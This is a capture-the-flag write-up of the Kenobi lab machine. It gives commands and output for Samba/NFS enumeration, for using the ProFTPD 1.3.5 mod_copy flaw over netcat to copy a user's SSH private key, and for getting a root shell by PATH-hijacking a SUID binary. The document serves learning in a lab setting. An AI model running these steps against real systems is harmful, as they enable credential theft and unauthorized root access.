Description: Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

## Resources:

[http://www.proftpd.org/docs/contrib/mod_copy.html#SITE_CPFR](http://www.proftpd.org/docs/contrib/mod_copy.html#SITE_CPFR)

```jsx
`Searchsploit` ~ cmd line for exploit-db
```

### What is Samba?

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

## Information Gathering

Firstly we do a nmap scan using my go to flags

```jsx
# Nmap 7.95 scan initiated Fri Jun  6 16:02:31 2025 as: /usr/lib/nmap/nmap --privileged -sS -oN nmap_half_scan 10.10.246.17
Nmap scan report for 10.10.246.17
Host is up (0.20s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

# Nmap done at Fri Jun  6 16:02:35 2025 -- 1 IP address (1 host up) scanned in 4.24 seconds
                                                                                             
```

Using some scripts on port 445

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.217.222

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-06-09 20:18 +0545
Nmap scan report for 10.10.217.222
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\\\10.10.217.222\\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\\\10.10.217.222\\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\\home\\kenobi\\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\\\10.10.217.222\\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\\var\\lib\\samba\\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 27.39 seconds
                                                                  
```

On further inspection on user: anonymous

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ smbclient //10.10.217.222/anonymous

Password for [WORKGROUP\\namura]:
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Wed Sep  4 16:34:09 2019
  ..                                  D        0  Wed Sep  4 16:41:07 2019
  log.txt                             N    12237  Wed Sep  4 16:34:09 2019

                9204224 blocks of size 1024. 6877096 blocks available

```

Then we downloaded the file on out local device using `smbclient`

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ smbclient //10.10.217.222/anonymous --user Anonymous -p 139  -N 
Try "help" to get a list of possible commands.
smb: \\> mget *
Get file log.txt? //bhayena
smb: \\> get log.txt
getting file \\log.txt of size 12237 as log.txt (16.4 KiloBytes/sec) (average 16.4 KiloBytes/sec)
smb: \\> 

On local device:
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ ll     
total 28
-rw-r--r-- 1 namura namura 12237 Jun  9 20:40 log.txt
```

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.217.222

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-06-09 20:44 +0545
Nmap scan report for 10.10.217.222
Host is up (0.26s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836512.0  6877116.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 5.01 seconds                                                
```

Let us also check the `ftp` server

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ nmap -sV -sS -p21 10.10.217.222
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-06-09 20:51 +0545
Nmap scan report for 10.10.217.222
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
                                                                                  
```

## Now for Vuln analysis

We first check if any vulns are available for the particular version

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ searchsploit proftpd 1.3.5
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)             | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                   | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)               | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                             | linux/remote/36742.txt
---------------------------------------------------------------------- ---------------------------------
```

We got the ones we need, cmd exec and RCE, file cpy

For mod_copy:

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

## Now for exploitation

Using the ftp server, we get the private key for user: kenobi in `/home/kenobi/.ssh/id_rsa`

and we move it to `/var/tmp/id_rsa` on the ftp server

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ nc 10.10.217.222 21            
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.217.222]

500 Invalid command: try being more creative
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Then we mount the NFS to out local mount on `/mnt/kenobiNFS`

We create a directory and then we list them

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ sudo mount 10.10.217.222:/var /mnt/kenobiNFS

                                                                                                        
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ ls -la /mnt/kenobiNFS

total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Jun  6 17:22 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 13  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Jun  9 21:05 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

```

Now we just copy the id_rsa to out local folder that is `~/thm/kenobi` for me

![image.png](attachment:1256882e-2f97-4a9b-ac2d-2810b0e0f622:image.png)

Then chmod haru ani ssh garne

Ani tyas paxi ta ez, `user.txt` lai cat and we get the flag

## Now for Privilege escalation

We find the `suid bit` and we try some of the binaries

```jsx
┌──(namura㉿namu)-[~/thm/kenobi]
└─$ ssh -i id_rsa kenobi@10.10.217.222          
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/advantage>

103 packages can be updated.
65 updates are security updates.

Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```

The menu seems a bit off

```jsx
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Mon, 09 Jun 2025 15:33:45 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:52:7e:97:ac:01  
          inet addr:10.10.217.222  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::52:7eff:fe97:ac01/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1343 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1265 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:149573 (149.5 KB)  TX bytes:232931 (232.9 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:198 errors:0 dropped:0 overruns:0 frame:0
          TX packets:198 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:14581 (14.5 KB)  TX bytes:14581 (14.5 KB)
```

We checked the binary and we see such, It seems to be a `Apache/2.4.18 (Ubuntu)` server on `4.8.0-58-generic` kernel version

### We do some digging find nothing

```jsx
┌──(namura㉿namu)-[~]
└─$ searchsploit 4.8.0-58-generic

Exploits: No Results
Shellcodes: No Results
                                                                                                                                                                                                                  
┌──(namura㉿namu)-[~]
└─$ searchsploit Apache/2.4.18   
Exploits: No Results
Shellcodes: No Results
                                                                                                                                                                                                                  
┌──(namura㉿namu)-[~]
└─$ searchsploit 2.4.18        
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4.18/2.4.19 - Privileged File Descriptor Resource Exhaustion (Denial of Service)                                                                                 | linux/dos/21598.c
Sync Breeze Enterprise 12.4.18 - 'Sync Breeze Enterprise' Unquoted Service Path                                                                                                 | windows/local/48045.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                  
┌──(namura㉿namu)-[~]
└─$ searchsploit apache 2.4.18 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                 | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                               | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                                                                           | linux/local/46676.php
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                             | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                            | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                      | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                      | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                             | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                               | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                             | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                       | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                    | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                    | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                    | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                | linux/remote/34.pl
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

### Then on the binary file we see some `strings`

```jsx
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig`
** Enter your choice :
**curl -I localhost
uname -r
ifconfig**
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
menu.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment

```

Now we leverage the `PATH` to fake `curl` and escalate privilege

### First we gotta cd to `/tmp`

![image.png](attachment:14c3f5d1-daa0-4bf8-a4b2-b64cdcf41a8f:image.png)

- **Binary with Insecure Path Usage**:
    
    - A program (`/usr/bin/menu`) is running commands like `curl`, `uname`, `ifconfig` **without using their full path** (e.g., `/usr/bin/curl`).
    - This is dangerous because Linux searches your environment's `PATH` to find those commands — and you can manipulate `PATH`.
- **Crafting a Fake `curl`**:
    
    - You create a fake "curl" that is actually a shell (`/bin/sh`) and name it `curl`.
        
        ```bash
        echo /bin/sh > curl
        chmod 777 curl
        ```
        
- **Modifying PATH**:
    
    - You change the `PATH` so that the system looks in your current directory (`/tmp`) **first** before looking in the default directories.
        
        ```bash
        export PATH=/tmp:$PATH
        ```
        
- **Running the Vulnerable Program**:
    
    - When you run `/usr/bin/menu` and it calls `curl`, it finds **your fake one** and runs `/bin/sh` — as **root** — because the program itself is run with root privileges.
- **Gaining Root Shell**:
    
    - You end up with a **root shell** (`#` prompt) even though you started as a normal user (`$` prompt).

Now we cat the `/root/root.txt` and profit

```jsx
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh >curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# ls
curl  systemd-private-02715af251df4edfa41bab5c5a87df17-systemd-timesyncd.service-fDVx77
# whoami  
root
# cat /root/root.txt

```

### Fairly simple but confusing for first timers like me